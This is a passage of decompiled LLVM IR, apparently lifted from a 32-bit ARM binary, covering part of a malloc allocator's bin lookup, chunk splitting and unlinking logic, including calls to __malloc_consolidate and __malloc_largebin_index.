  %v4_14078 = inttoptr i32 %v3_14078 to i32*
  store i32 12, i32* %v4_14078, align 4
  br label %dec_label_pc_14904

dec_label_pc_14080:                               ; preds = %entry
  %v1_14080 = add i32 %v0_1405c, 11
  store i32 %v1_14080, i32* %r0.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_24478.766 to i32), i32* %r2.global-to-local, align 4
  %v2_1408c = icmp ugt i32 %v1_14080, 14
  %v7_1408c = icmp eq i32 %v1_14080, 15
  %v2_14090 = xor i1 %v7_1408c, true
  %v3_14090 = and i1 %v2_1408c, %v2_14090
  br i1 %v3_14090, label %bb, label %bb141

bb:                                               ; preds = %dec_label_pc_14080
  %v5_14090 = and i32 %v1_14080, -8
  store i32 %v5_14090, i32* @sl, align 4
  br label %bb141

bb141:                                            ; preds = %dec_label_pc_14080, %bb
  %v4_14094 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24478.766 to i32), i32 64) to i32*), align 4
  store i32 %v4_14094, i32* @r0, align 4
  %v1_14098 = inttoptr i32 %v4_14094 to i32*
  %v2_14098 = load i32, i32* %v1_14098, align 4
  store i32 %v2_14098, i32* @r4, align 4
  %v2_1409c = xor i1 %v2_1408c, true
  %v3_1409c = or i1 %v7_1408c, %v2_1409c
  br i1 %v3_1409c, label %bb142, label %bb143

bb142:                                            ; preds = %bb141
  store i32 16, i32* @sl, align 4
  br label %bb143

bb143:                                            ; preds = %bb141, %bb142
  %v1_140a0 = urem i32 %v2_14098, 2
  %v2_140a0 = icmp eq i32 %v1_140a0, 0
  br i1 %v2_140a0, label %dec_label_pc_140a8, label %dec_label_pc_140b8

dec_label_pc_140a8:                               ; preds = %bb143
  %v2_140a8 = icmp eq i32 %v2_14098, 0
  br i1 %v2_140a8, label %dec_label_pc_140b0, label %dec_label_pc_14494

dec_label_pc_140b0:                               ; preds = %dec_label_pc_140a8
  %v0_140b0 = call i32 @__malloc_consolidate()
  store i32 %v0_140b0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14494

dec_label_pc_140b8:                               ; preds = %bb143
  %v0_140b8 = load i32, i32* @sl, align 4
  %tmp204 = icmp ugt i32 %v0_140b8, %v2_14098
  br i1 %tmp204, label %dec_label_pc_140e0, label %dec_label_pc_140c0

dec_label_pc_140c0:                               ; preds = %dec_label_pc_140b8
  %v1_140c0 = add i32 %v4_14094, -4
  store i32 %v1_140c0, i32* %r1.global-to-local, align 4
  %v3_140c4 = udiv i32 %v0_140b8, 8
  store i32 %v3_140c4, i32* %r2.global-to-local, align 4
  %v4_140c8 = mul nuw i32 %v3_140c4, 4
  %v5_140c8 = add i32 %v4_140c8, %v1_140c0
  %v6_140c8 = inttoptr i32 %v5_140c8 to i32*
  %v7_140c8 = load i32, i32* %v6_140c8, align 4
  store i32 %v7_140c8, i32* %r0.global-to-local, align 4
  %v2_140cc = icmp eq i32 %v7_140c8, 0
  br i1 %v2_140cc, label %dec_label_pc_140e0, label %.thread4

.thread4:                                         ; preds = %dec_label_pc_140c0
  %v2_140d0 = add i32 %v7_140c8, 8
  %v3_140d0 = inttoptr i32 %v2_140d0 to i32*
  %v4_140d0 = load i32, i32* %v3_140d0, align 4
  store i32 %v4_140d0, i32* %r3.global-to-local, align 4
  store i32 %v2_140d0, i32* %r0.global-to-local, align 4
  store i32 %v2_140d0, i32* %r4.global-to-local, align 4
  store i32 %v4_140d0, i32* %v6_140c8, align 4
  br label %dec_label_pc_148e8

dec_label_pc_140e0:                               ; preds = %dec_label_pc_140c0, %dec_label_pc_140b8
  %tmp205 = icmp ugt i32 %v0_140b8, 255
  br i1 %tmp205, label %dec_label_pc_14130, label %dec_label_pc_140e8

dec_label_pc_140e8:                               ; preds = %dec_label_pc_140e0
  store i32 ptrtoint (i32* @global_var_24478.766 to i32), i32* %ip.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v4_140f0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24478.766 to i32), i32 64) to i32*), align 4
  %v3_140f4 = udiv i32 %v0_140b8, 8
  store i32 %v3_140f4, i32* @r7, align 4
  %v4_140f8 = mul nuw i32 %v3_140f4, 8
  %v5_140f8 = add i32 %v4_140f0, %v4_140f8
  store i32 %v5_140f8, i32* %r3.global-to-local, align 4
  %v1_140fc = add i32 %v5_140f8, 44
  store i32 %v1_140fc, i32* %ip.global-to-local, align 4
  %v1_14100 = add i32 %v5_140f8, 56
  %v2_14100 = inttoptr i32 %v1_14100 to i32*
  %v3_14100 = load i32, i32* %v2_14100, align 4
  store i32 %v3_14100, i32* %r0.global-to-local, align 4
  %v9_14104 = icmp eq i32 %v3_14100, %v1_140fc
  br i1 %v9_14104, label %dec_label_pc_14290, label %dec_label_pc_1410c

dec_label_pc_1410c:                               ; preds = %dec_label_pc_140e8
  %v2_1410c = add i32 %v3_14100, %v0_140b8
  store i32 %v2_1410c, i32* %r3.global-to-local, align 4
  %v1_14110 = add i32 %v2_1410c, 4
  %v2_14110 = inttoptr i32 %v1_14110 to i32*
  %v3_14110 = load i32, i32* %v2_14110, align 4
  store i32 %v3_14110, i32* %r2.global-to-local, align 4
  %v1_14114 = add i32 %v3_14100, 12
  %v2_14114 = inttoptr i32 %v1_14114 to i32*
  %v3_14114 = load i32, i32* %v2_14114, align 4
  store i32 %v3_14114, i32* %r1.global-to-local, align 4
  %v1_14118 = or i32 %v3_14110, 1
  store i32 %v1_14118, i32* %r2.global-to-local, align 4
  %v1_1411c = add i32 %v3_14100, 8
  store i32 %v1_1411c, i32* %r4.global-to-local, align 4
  store i32 %v1_14118, i32* %v2_14110, align 4
  %v0_14124 = load i32, i32* %ip.global-to-local, align 4
  %v1_14124 = load i32, i32* %r1.global-to-local, align 4
  %v2_14124 = add i32 %v1_14124, 8
  %v3_14124 = inttoptr i32 %v2_14124 to i32*
  store i32 %v0_14124, i32* %v3_14124, align 4
  %v0_14128 = load i32, i32* %r1.global-to-local, align 4
  %v1_14128 = load i32, i32* %ip.global-to-local, align 4
  %v2_14128 = add i32 %v1_14128, 12
  %v3_14128 = inttoptr i32 %v2_14128 to i32*
  store i32 %v0_14128, i32* %v3_14128, align 4
  br label %dec_label_pc_148e8

dec_label_pc_14130:                               ; preds = %dec_label_pc_140e0
  store i32 %v0_140b8, i32* %r0.global-to-local, align 4
  %v1_14134 = call i32 @__malloc_largebin_index(i32 %v0_140b8)
  store i32 %v1_14134, i32* %r0.global-to-local, align 4
  %v0_14138 = load i32, i32* @r4, align 4
  %v1_14138 = and i32 %v0_14138, 2
  %v2_14138 = icmp eq i32 %v1_14138, 0
  store i32 %v1_14134, i32* @r7, align 4
  br i1 %v2_14138, label %dec_label_pc_14290, label %dec_label_pc_14144

dec_label_pc_14144:                               ; preds = %dec_label_pc_14130
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_24478.766 to i32), i32* %r1.global-to-local, align 4
  %v4_1414c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24478.766 to i32), i32 64) to i32*), align 4
  store i32 %v4_1414c, i32* @r0, align 4
  %v0_14150 = call i32 @__malloc_consolidate()
  store i32 %v0_14150, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14290

dec_label_pc_14158:                               ; preds = %dec_label_pc_142a4
  %v1_14158 = add i32 %v3_142a4, 4
  %v2_14158 = inttoptr i32 %v1_14158 to i32*
  %v3_14158 = load i32, i32* %v2_14158, align 4
  store i32 %v3_14158, i32* %r3.global-to-local, align 4
  %v0_1415c = load i32, i32* @sl, align 4
  %v1_14160 = and i32 %v3_14158, -4
  store i32 %v1_14160, i32* %r4.global-to-local, align 4
  %v1_14164 = add i32 %v3_142a4, 12
  %v2_14164 = inttoptr i32 %v1_14164 to i32*
  %v3_14164 = load i32, i32* %v2_14164, align 4
  store i32 %v3_14164, i32* %ip.global-to-local, align 4
  %tmp206 = icmp ugt i32 %v0_1415c, 255
  br i1 %tmp206, label %dec_label_pc_141c0, label %dec_label_pc_1416c

dec_label_pc_1416c:                               ; preds = %dec_label_pc_14158
  %v9_1416c = icmp eq i32 %v3_14164, %v0_141c4
  br i1 %v9_1416c, label %dec_label_pc_14174, label %dec_label_pc_141c0

dec_label_pc_14174:                               ; preds = %dec_label_pc_1416c
  %v0_14174 = load i32, i32* @sb, align 4
  %v1_14174 = add i32 %v0_14174, 48
  %v2_14174 = inttoptr i32 %v1_14174 to i32*
  %v3_14174 = load i32, i32* %v2_14174, align 4
  store i32 %v3_14174, i32* %r3.global-to-local, align 4
  %v9_14178 = icmp eq i32 %v3_142a4, %v3_14174
  br i1 %v9_14178, label %dec_label_pc_14180, label %dec_label_pc_141c0

dec_label_pc_14180:                               ; preds = %dec_label_pc_14174
  %v1_14180 = load i32, i32* @fp, align 4
  %tmp207 = icmp ugt i32 %v1_14160, %v1_14180
  br i1 %tmp207, label %dec_label_pc_14188, label %dec_label_pc_141c0

dec_label_pc_14188:                               ; preds = %dec_label_pc_14180
  %v2_14188 = sub i32 %v1_14160, %v0_1415c
  store i32 %v2_14188, i32* %r2.global-to-local, align 4
  %v2_1418c = add i32 %v0_1415c, %v3_142a4
  store i32 %v2_1418c, i32* %r3.global-to-local, align 4
  %v1_14190 = or i32 %v0_1415c, 1
  store i32 %v1_14190, i32* %r0.global-to-local, align 4
  %v1_14194 = or i32 %v2_14188, 1
  store i32 %v1_14194, i32* %r1.global-to-local, align 4
  %v1_14198 = add i32 %v3_142a4, 8
  store i32 %v1_14198, i32* %r4.global-to-local, align 4
  %v2_1419c = add i32 %v0_141c4, 8
  %v3_1419c = inttoptr i32 %v2_1419c to i32*
  store i32 %v2_1418c, i32* %v3_1419c, align 4
  %v0_141a0 = load i32, i32* %r3.global-to-local, align 4
  %v1_141a0 = load i32, i32* %ip.global-to-local, align 4
  %v2_141a0 = add i32 %v1_141a0, 12
  %v3_141a0 = inttoptr i32 %v2_141a0 to i32*
  store i32 %v0_141a0, i32* %v3_141a0, align 4
  %v0_141a4 = load i32, i32* %r0.global-to-local, align 4
  %v1_141a4 = load i32, i32* @r6, align 4
  %v2_141a4 = add i32 %v1_141a4, 4
  %v3_141a4 = inttoptr i32 %v2_141a4 to i32*
  store i32 %v0_141a4, i32* %v3_141a4, align 4
  %v0_141a8 = load i32, i32* %r3.global-to-local, align 4
  %v1_141a8 = load i32, i32* @sb, align 4
  %v2_141a8 = add i32 %v1_141a8, 48
  %v3_141a8 = inttoptr i32 %v2_141a8 to i32*
  store i32 %v0_141a8, i32* %v3_141a8, align 4
  %v0_141ac = load i32, i32* %r2.global-to-local, align 4
  %v1_141ac = load i32, i32* %r3.global-to-local, align 4
  %v3_141ac = add i32 %v1_141ac, %v0_141ac
  %v4_141ac = inttoptr i32 %v3_141ac to i32*
  store i32 %v0_141ac, i32* %v4_141ac, align 4
  %v0_141b0 = load i32, i32* %r1.global-to-local, align 4
  %v1_141b0 = load i32, i32* %r3.global-to-local, align 4
  %v2_141b0 = add i32 %v1_141b0, 4
  %v3_141b0 = inttoptr i32 %v2_141b0 to i32*
  store i32 %v0_141b0, i32* %v3_141b0, align 4
  %v0_141b4 = load i32, i32* %ip.global-to-local, align 4
  %v1_141b4 = load i32, i32* %r3.global-to-local, align 4
  %v2_141b4 = add i32 %v1_141b4, 12
  %v3_141b4 = inttoptr i32 %v2_141b4 to i32*
  store i32 %v0_141b4, i32* %v3_141b4, align 4
  %v0_141b8 = load i32, i32* %ip.global-to-local, align 4
  %v1_141b8 = load i32, i32* %r3.global-to-local, align 4
  %v2_141b8 = add i32 %v1_141b8, 8
  %v3_141b8 = inttoptr i32 %v2_141b8 to i32*
  store i32 %v0_141b8, i32* %v3_141b8, align 4
  br label %dec_label_pc_148e8

dec_label_pc_141c0:                               ; preds = %dec_label_pc_14180, %dec_label_pc_14174, %dec_label_pc_1416c, %dec_label_pc_14158
  %v9_141c0 = icmp eq i32 %v1_14160, %v0_1415c
  %v2_141c4 = add i32 %v3_14164, 8
  %v3_141c4 = inttoptr i32 %v2_141c4 to i32*
  store i32 %v0_141c4, i32* %v3_141c4, align 4
  %v0_141c8 = load i32, i32* %ip.global-to-local, align 4
  %v1_141c8 = load i32, i32* %r5.global-to-local, align 4
  %v2_141c8 = add i32 %v1_141c8, 12
  %v3_141c8 = inttoptr i32 %v2_141c8 to i32*
  store i32 %v0_141c8, i32* %v3_141c8, align 4
  br i1 %v9_141c0, label %dec_label_pc_14320.loopexit, label %dec_label_pc_141dc

dec_label_pc_141dc:                               ; preds = %dec_label_pc_141c0
  %v0_141dc = load i32, i32* %r4.global-to-local, align 4
  %tmp208 = icmp ugt i32 %v0_141dc, 255
  br i1 %tmp208, label %dec_label_pc_14200, label %dec_label_pc_141e4

dec_label_pc_141e4:                               ; preds = %dec_label_pc_141dc
  store i32 ptrtoint (i32* @global_var_24478.766 to i32), i32* %r2.global-to-local, align 4
  %v1_141e8 = load i32, i32* %r8.global-to-local, align 4
  %v2_141e8 = add i32 %v1_141e8, ptrtoint (i32* @global_var_24478.766 to i32)
  %v3_141e8 = inttoptr i32 %v2_141e8 to i32*
  %v4_141e8 = load i32, i32* %v3_141e8, align 4
  %v3_141ec = udiv i32 %v0_141dc, 8
  store i32 %v3_141ec, i32* %r0.global-to-local, align 4
  %v4_141f0 = mul nuw i32 %v3_141ec, 8
  %v5_141f0 = add i32 %v4_141e8, %v4_141f0
  store i32 %v5_141f0, i32* %r3.global-to-local, align 4
  %v1_141f4 = add i32 %v5_141f0, 44
  store i32 %v1_141f4, i32* %ip.global-to-local, align 4
  %v1_141f8 = add i32 %v5_141f0, 52
  %v2_141f8 = inttoptr i32 %v1_141f8 to i32*
  %v3_141f8 = load i32, i32* %v2_141f8, align 4
  store i32 %v3_141f8, i32* @lr, align 4
  br label %dec_label_pc_14258

dec_label_pc_14200:                               ; preds = %dec_label_pc_141dc
  store i32 %v0_141dc, i32* %r0.global-to-local, align 4
  %v1_14204 = call i32 @__malloc_largebin_index(i32 %v0_141dc)
  store i32 %v1_14204, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_24478.766 to i32), i32* %ip.global-to-local, align 4
  %v1_1420c = load i32, i32* %r8.global-to-local, align 4
  %v2_1420c = add i32 %v1_1420c, ptrtoint (i32* @global_var_24478.766 to i32)
  %v3_1420c = inttoptr i32 %v2_1420c to i32*
  %v4_1420c = load i32, i32* %v3_1420c, align 4
  %v4_14210 = mul i32 %v1_14204, 8
  %v5_14210 = add i32 %v4_1420c, %v4_14210
  store i32 %v5_14210, i32* %r3.global-to-local, align 4
  %v1_14214 = add i32 %v5_14210, 44
  store i32 %v1_14214, i32* %ip.global-to-local, align 4
  %v1_14218 = add i32 %v5_14210, 52
  %v2_14218 = inttoptr i32 %v1_14218 to i32*
  %v3_14218 = load i32, i32* %v2_14218, align 4
  store i32 %v3_14218, i32* @lr, align 4
  %v9_1421c = icmp eq i32 %v3_14218, %v1_14214
  br i1 %v9_1421c, label %dec_label_pc_14258, label %dec_label_pc_14224

dec_label_pc_14224:                               ; preds = %dec_label_pc_14200
  %v1_14224 = add i32 %v5_14210, 56
  %v2_14224 = inttoptr i32 %v1_14224 to i32*
  %v3_14224 = load i32, i32* %v2_14224, align 4
  store i32 %v3_14224, i32* %r1.global-to-local, align 4
  %v1_14228 = add i32 %v3_14224, 4
  %v2_14228 = inttoptr i32 %v1_14228 to i32*
  %v3_14228 = load i32, i32* %v2_14228, align 4
  store i32 %v3_14228, i32* %r3.global-to-local, align 4
  %v0_1422c = load i32, i32* %r4.global-to-local, align 4
  %v3_1422c = icmp ult i32 %v0_1422c, %v3_14228
  br i1 %v3_1422c, label %.thread, label %dec_label_pc_14248.preheader

.thread:                                          ; preds = %dec_label_pc_14224
  store i32 %v1_14214, i32* @lr, align 4
  store i32 %v3_14224, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_14258

dec_label_pc_14248.preheader:                     ; preds = %dec_label_pc_14224
  %v2_14234 = or i32 %v0_1422c, 1
  store i32 %v2_14234, i32* %r2.global-to-local, align 4
  %v1_14248182 = add i32 %v3_14218, 4
  %v2_14248183 = inttoptr i32 %v1_14248182 to i32*
  %v3_14248184 = load i32, i32* %v2_14248183, align 4
  store i32 %v3_14248184, i32* %r3.global-to-local, align 4
  %v3_1424c186 = icmp ult i32 %v2_14234, %v3_14248184
  br i1 %v3_1424c186, label %dec_label_pc_14244, label %dec_label_pc_14254

dec_label_pc_14244:                               ; preds = %dec_label_pc_14248.preheader, %dec_label_pc_14244
  %v0_14254187 = phi i32 [ %v3_14244, %dec_label_pc_14244 ], [ %v3_14218, %dec_label_pc_14248.preheader ]
  %v1_14244 = add i32 %v0_14254187, 8
  %v2_14244 = inttoptr i32 %v1_14244 to i32*
  %v3_14244 = load i32, i32* %v2_14244, align 4
  store i32 %v3_14244, i32* @lr, align 4
  %v1_14248 = add i32 %v3_14244, 4
  %v2_14248 = inttoptr i32 %v1_14248 to i32*
  %v3_14248 = load i32, i32* %v2_14248, align 4
  store i32 %v3_14248, i32* %r3.global-to-local, align 4
  %v3_1424c = icmp ult i32 %v2_14234, %v3_14248
  br i1 %v3_1424c, label %dec_label_pc_14244, label %dec_label_pc_14254

dec_label_pc_14254:                               ; preds = %dec_label_pc_14244, %dec_label_pc_14248.preheader
  %v0_14254.lcssa = phi i32 [ %v3_14218, %dec_label_pc_14248.preheader ], [ %v3_14244, %dec_label_pc_14244 ]
  %v1_14254 = add i32 %v0_14254.lcssa, 12
  %v2_14254 = inttoptr i32 %v1_14254 to i32*
  %v3_14254 = load i32, i32* %v2_14254, align 4
  store i32 %v3_14254, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_14258

dec_label_pc_14258:                               ; preds = %.thread, %dec_label_pc_14200, %dec_label_pc_141e4, %dec_label_pc_14254
  %v0_14278 = phi i32 [ %v1_14214, %dec_label_pc_14200 ], [ %v1_141f4, %dec_label_pc_141e4 ], [ %v3_14254, %dec_label_pc_14254 ], [ %v3_14224, %.thread ]
  %v0_1426c = phi i32 [ %v1_14204, %dec_label_pc_14200 ], [ %v3_141ec, %dec_label_pc_141e4 ], [ %v1_14204, %dec_label_pc_14254 ], [ %v1_14204, %.thread ]
  %v1_1425c = phi i32 [ %v1_1420c, %dec_label_pc_14200 ], [ %v1_141e8, %dec_label_pc_141e4 ], [ %v1_1420c, %dec_label_pc_14254 ], [ %v1_1420c, %.thread ]
  store i32 ptrtoint (i32* @global_var_24478.766 to i32), i32* %r2.global-to-local, align 4
  %v2_1425c = add i32 %v1_1425c, ptrtoint (i32* @global_var_24478.766 to i32)
  %v3_1425c = inttoptr i32 %v2_1425c to i32*
  %v4_1425c = load i32, i32* %v3_1425c, align 4
  %v3_14260 = sdiv i32 %v0_1426c, 32
  store i32 %v3_14260, i32* %r3.global-to-local, align 4
  %v4_14264 = mul nsw i32 %v3_14260, 4
  %v5_14264 = add i32 %v4_1425c, %v4_14264
  store i32 %v5_14264, i32* %r1.global-to-local, align 4
  %v1_14268 = add i32 %v5_14264, 820
  %v2_14268 = inttoptr i32 %v1_14268 to i32*
  %v3_14268 = load i32, i32* %v2_14268, align 4
  %v1_1426c = urem i32 %v0_1426c, 32
  store i32 %v1_1426c, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v7_14274 = shl i32 1, %v1_1426c
  %v8_14274 = or i32 %v3_14268, %v7_14274
  store i32 %v8_14274, i32* %r3.global-to-local, align 4
  %v1_14278 = load i32, i32* @r6, align 4
  %v2_14278 = add i32 %v1_14278, 12
  %v3_14278 = inttoptr i32 %v2_14278 to i32*
  store i32 %v0_14278, i32* %v3_14278, align 4
  %v0_1427c = load i32, i32* @lr, align 4
  %v1_1427c = load i32, i32* @r6, align 4
  %v2_1427c = add i32 %v1_1427c, 8
  %v3_1427c = inttoptr i32 %v2_1427c to i32*
  store i32 %v0_1427c, i32* %v3_1427c, align 4
  %v0_14280 = load i32, i32* %r3.global-to-local, align 4
  %v1_14280 = load i32, i32* %r1.global-to-local, align 4
  %v2_14280 = add i32 %v1_14280, 820
  %v3_14280 = inttoptr i32 %v2_14280 to i32*
  store i32 %v0_14280, i32* %v3_14280, align 4
  %v0_14284 = load i32, i32* @r6, align 4
  %v1_14284 = load i32, i32* @lr, align 4
  %v2_14284 = add i32 %v1_14284, 12
  %v3_14284 = inttoptr i32 %v2_14284 to i32*
  store i32 %v0_14284, i32* %v3_14284, align 4
  %v0_14288 = load i32, i32* @r6, align 4
  %v1_14288 = load i32, i32* %ip.global-to-local, align 4
  %v2_14288 = add i32 %v1_14288, 8
  %v3_14288 = inttoptr i32 %v2_14288 to i32*
  store i32 %v0_14288, i32* %v3_14288, align 4
  %v0_142a4.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_142a4

dec_label_pc_14290:                               ; preds = %dec_label_pc_14130, %dec_label_pc_140e8, %dec_label_pc_14144
  store i32 64, i32* %r8.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_24478.766 to i32), i32* %r1.global-to-local, align 4
  %v4_14298 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24478.766 to i32), i32 64) to i32*), align 4
  store i32 %v4_14298, i32* @sb, align 4
  %v0_1429c = load i32, i32* @sl, align 4
  %v1_1429c = add i32 %v0_1429c, 16
  store i32 %v1_1429c, i32* @fp, align 4
  %v1_142a0 = add i32 %v4_14298, 52
  store i32 %v1_142a0, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_142a4

dec_label_pc_142a4:                               ; preds = %dec_label_pc_14258, %dec_label_pc_14290
  %v0_141c4 = phi i32 [ %v0_142a4.pre, %dec_label_pc_14258 ], [ %v1_142a0, %dec_label_pc_14290 ]
  %v1_142a4 = add i32 %v0_141c4, 12
  %v2_142a4 = inttoptr i32 %v1_142a4 to i32*
  %v3_142a4 = load i32, i32* %v2_142a4, align 4
  store i32 %v3_142a4, i32* @r6, align 4
  %v9_142a8 = icmp eq i32 %v3_142a4, %v0_141c4
  br i1 %v9_142a8, label %dec_label_pc_142b0, label %dec_label_pc_14158

dec_label_pc_142b0:                               ; preds = %dec_label_pc_142a4
  %v0_142b0 = load i32, i32* @sl, align 4
  %tmp209 = icmp ult i32 %v0_142b0, 256
  %v0_14368.pre = load i32, i32* @r7, align 4
  br i1 %tmp209, label %dec_label_pc_142b0.dec_label_pc_14368_crit_edge, label %dec_label_pc_142b8

dec_label_pc_142b0.dec_label_pc_14368_crit_edge:  ; preds = %dec_label_pc_142b0
  %.pre203 = mul i32 %v0_14368.pre, 8
  br label %dec_label_pc_14368

dec_label_pc_142b8:                               ; preds = %dec_label_pc_142b0
  %v4_142b8 = mul i32 %v0_14368.pre, 8
  %v5_142b8 = add i32 %v4_142b8, %v0_141c4
  store i32 %v5_142b8, i32* %r3.global-to-local, align 4
  %v1_142bc = add i32 %v5_142b8, -8
  store i32 %v1_142bc, i32* %r1.global-to-local, align 4
  %v1_142c0 = add i32 %v5_142b8, 4
  %v2_142c0 = inttoptr i32 %v1_142c0 to i32*
  %storemerge.pre = load i32, i32* %v2_142c0, align 4
  br label %dec_label_pc_14360

dec_label_pc_142c8:                               ; preds = %dec_label_pc_14360
  %v1_142c8 = add i32 %v1_142f0, 4
  %v2_142c8 = inttoptr i32 %v1_142c8 to i32*
  %v3_142c8 = load i32, i32* %v2_142c8, align 4
  store i32 %v3_142c8, i32* %r3.global-to-local, align 4
  %v1_142cc = and i32 %v3_142c8, -4
  store i32 %v1_142cc, i32* %r2.global-to-local, align 4
  %v3_142d0 = icmp ult i32 %v1_142cc, %v0_142b0
  %v1_142d4 = add i32 %v1_142f0, 12
  %v2_142d4 = inttoptr i32 %v1_142d4 to i32*
  %v3_142d4 = load i32, i32* %v2_142d4, align 4
  store i32 %v3_142d4, i32* %r0.global-to-local, align 4
  br i1 %v3_142d0, label %dec_label_pc_14360, label %dec_label_pc_142dc

dec_label_pc_142dc:                               ; preds = %dec_label_pc_142c8
  %v1_142dc = add i32 %v1_142f0, 8
  %v2_142dc = inttoptr i32 %v1_142dc to i32*
  %v3_142dc = load i32, i32* %v2_142dc, align 4
  store i32 %v3_142dc, i32* %r1.global-to-local, align 4
  %v1_142e0 = add i32 %v3_142dc, 12
  %v2_142e0 = inttoptr i32 %v1_142e0 to i32*
  %v3_142e0 = load i32, i32* %v2_142e0, align 4
  store i32 %v3_142e0, i32* %r3.global-to-local, align 4
  %v9_142e4 = icmp eq i32 %v3_142e0, %v1_142f0
  br i1 %v9_142e4, label %dec_label_pc_142ec, label %dec_label_pc_142f8

dec_label_pc_142ec:                               ; preds = %dec_label_pc_142dc
  %v1_142ec = add i32 %v3_142d4, 8
  %v2_142ec = inttoptr i32 %v1_142ec to i32*
  %v3_142ec = load i32, i32* %v2_142ec, align 4
  store i32 %v3_142ec, i32* %r3.global-to-local, align 4
  %v9_142f0 = icmp eq i32 %v3_142ec, %v1_142f0
  br i1 %v9_142f0, label %dec_label_pc_142fc, label %dec_label_pc_142f8

dec_label_pc_142f8:                               ; preds = %dec_label_pc_142dc, %dec_label_pc_142ec
  %v0_142f8 = call i32 @abort()
  store i32 %v0_142f8, i32* %r0.global-to-local, align 4
  %v0_142fc.pre = load i32, i32* @sl, align 4
  %v1_142fc.pre = load i32, i32* @r2, align 4
  %v0_14304.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_142fc

dec_label_pc_142fc:                               ; preds = %dec_label_pc_142ec, %dec_label_pc_142f8
  %v1_14304 = phi i32 [ %v3_142d4, %dec_label_pc_142ec ], [ %v0_142f8, %dec_label_pc_142f8 ]
  %v0_14304 = phi i32 [ %v3_142dc, %dec_label_pc_142ec ], [ %v0_14304.pre, %dec_label_pc_142f8 ]
  %v1_142fc = phi i32 [ %v1_142cc, %dec_label_pc_142ec ], [ %v1_142fc.pre, %dec_label_pc_142f8 ]
  %v0_142fc = phi i32 [ %v0_142b0, %dec_label_pc_142ec ], [ %v0_142fc.pre, %dec_label_pc_142f8 ]
  %v2_142fc = sub i32 %v1_142fc, %v0_142fc
  store i32 %v2_142fc, i32* %lr.global-to-local, align 4
  %v2_14304 = add i32 %v1_14304, 8
  %v3_14304 = inttoptr i32 %v2_14304 to i32*
  store i32 %v0_14304, i32* %v3_14304, align 4
  %v0_14308 = load i32, i32* %r0.global-to-local, align 4
  %v1_14308 = load i32, i32* %r1.global-to-local, align 4
  %v2_14308 = add i32 %v1_14308, 12
  %v3_14308 = inttoptr i32 %v2_14308 to i32*
  store i32 %v0_14308, i32* %v3_14308, align 4
  %v0_1430c = load i32, i32* %ip.global-to-local, align 4
  %v1_1430c = add i32 %v0_1430c, 8
  store i32 %v1_1430c, i32* %r0.global-to-local, align 4
  %tmp210 = icmp ugt i32 %v2_142fc, 15
  br i1 %tmp210, label %dec_label_pc_1432c, label %dec_label_pc_14314

dec_label_pc_14314:                               ; preds = %dec_label_pc_142fc
  %v1_14314 = load i32, i32* %r2.global-to-local, align 4
  %v2_14314 = add i32 %v1_14314, %v0_1430c
  store i32 %v2_14314, i32* %r2.global-to-local, align 4
  %v1_14318 = add i32 %v2_14314, 4
  %v2_14318 = inttoptr i32 %v1_14318 to i32*
  %v3_14318 = load i32, i32* %v2_14318, align 4
  store i32 %v3_14318, i32* %r3.global-to-local, align 4
  store i32 %v1_1430c, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14320

dec_label_pc_14320.loopexit:                      ; preds = %dec_label_pc_141c0
  %v1_141cc = load i32, i32* @r6, align 4
  %v2_141cc = load i32, i32* @sl, align 4
  %v3_141cc = add i32 %v2_141cc, %v1_141cc
  store i32 %v3_141cc, i32* %r2.global-to-local, align 4
  %v2_141d0 = add i32 %v3_141cc, 4
  %v3_141d0 = inttoptr i32 %v2_141d0 to i32*
  %v4_141d0 = load i32, i32* %v3_141d0, align 4
  store i32 %v4_141d0, i32* %r3.global-to-local, align 4
  %v2_141d4 = add i32 %v1_141cc, 8
  store i32 %v2_141d4, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14320

dec_label_pc_14320:                               ; preds = %.dec_label_pc_14320_crit_edge, %dec_label_pc_14320.loopexit, %dec_label_pc_14314
  %v1_14324 = phi i32 [ %v4_14448, %.dec_label_pc_14320_crit_edge ], [ %v3_141cc, %dec_label_pc_14320.loopexit ], [ %v2_14314, %dec_label_pc_14314 ]
  %v0_14320 = phi i32 [ %v7_14448, %.dec_label_pc_14320_crit_edge ], [ %v4_141d0, %dec_label_pc_14320.loopexit ], [ %v3_14318, %dec_label_pc_14314 ]
  %v1_14320 = or i32 %v0_14320, 1
  store i32 %v1_14320, i32* %r3.global-to-local, align 4
  %v2_14324 = add i32 %v1_14324, 4
  %v3_14324 = inttoptr i32 %v2_14324 to i32*
  store i32 %v1_14320, i32* %v3_14324, align 4
  br label %dec_label_pc_148e8

dec_label_pc_1432c:                               ; preds = %dec_label_pc_142fc
  %v1_1432c = load i32, i32* @sl, align 4
  %v2_1432c = add i32 %v1_1432c, %v0_1430c
  store i32 %v2_1432c, i32* %r2.global-to-local, align 4
  %v1_14330 = or i32 %v1_1432c, 1
  store i32 %v1_14330, i32* %r3.global-to-local, align 4
  %v0_14334 = load i32, i32* %lr.global-to-local, align 4
  %v1_14334 = or i32 %v0_14334, 1
  store i32 %v1_14334, i32* %r1.global-to-local, align 4
  store i32 %v1_1430c, i32* %r4.global-to-local, align 4
  %v2_1433c = add i32 %v0_1430c, 4
  %v3_1433c = inttoptr i32 %v2_1433c to i32*
  store i32 %v1_14330, i32* %v3_1433c, align 4
  %v0_14340 = load i32, i32* %r2.global-to-local, align 4
  %v1_14340 = load i32, i32* @r6, align 4
  %v2_14340 = add i32 %v1_14340, 8
